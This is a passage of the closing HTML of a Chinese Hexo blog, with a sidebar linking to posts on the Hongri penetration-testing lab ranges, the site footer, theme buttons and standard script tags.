datetime="2024-01-23T09:28:25.268Z" title="发表于 2024-01-23 17:28:25">2024-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/" title="红日靶场四"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场四"></a><div class="content"><a class="title" href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/" title="红日靶场四">红日靶场四</a><time datetime="2024-01-23T09:25:42.516Z" title="发表于 2024-01-23 17:25:42">2024-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/" title="红日靶场二"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场二"></a><div class="content"><a class="title" href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/" title="红日靶场二">红日靶场二</a><time datetime="2024-01-23T09:22:35.758Z" title="发表于 2024-01-23 17:22:35">2024-01-23</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">©2024 By Bamboo22</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div><hr><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>
